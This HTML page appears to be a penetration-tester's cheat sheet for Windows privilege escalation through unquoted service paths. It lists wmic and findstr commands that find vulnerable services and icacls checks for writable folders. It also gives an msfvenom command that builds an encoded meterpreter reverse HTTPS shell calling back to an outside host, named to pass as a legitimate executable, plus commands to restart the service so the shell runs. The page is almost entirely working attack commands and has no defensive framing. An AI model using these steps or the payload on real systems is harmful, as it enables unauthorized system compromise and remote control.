<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Trusted service paths</title>
</head><body><b>Search for services with unqouted paths<br/>
</b><tt><br/>
</tt><tt>wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</tt><br/>
<br/>
<b>If we have some output let's inspect service path permissions<br/>
</b><tt><br/>
icacls &lt;folder in which we can place our file. File has same name as word in front of the space in the file path&gt;<br/>
</tt>example path:<br/>
<tt>C:\Program Files\Some Folder\Service.exe<br/>
</tt>we need<tt><br/>
</tt><tt>icacls C:\ (we can place file Program.exe)<br/>
icacls C:\Program Files\ (we can place file Some.exe)<br/>
<br/>
</tt><b>If folder has M or W or F permission then we can place our file into the path.</b><tt><br/>
</tt><tt><br/>
</tt><b>Sample payload<br/>
</b><br/>
<tt>msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o Privatefirewall.exe<br/>
<br/>
</tt><b>Restarting service<br/>
</b><tt><br/>
sc stop &lt;service&gt;<br/>
sc start &lt;service&gt;<br/>
<br/>
</tt><b>List all service paths to file for manual inspection<br/>
</b><tt><br/>
sc query state= all | findstr &quot;SERVICE_NAME:&quot; &gt;&gt; Servicenames.txt<br/>
type Servicenames.txt<br/>
FOR /F &quot;tokens=2 delims= &quot; %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt<br/>
FOR /F %i in (services.txt) DO @sc qc %i | findstr &quot;BINARY_PATH_NAME&quot; &gt;&gt; path.txt<br/>
</tt></body></html>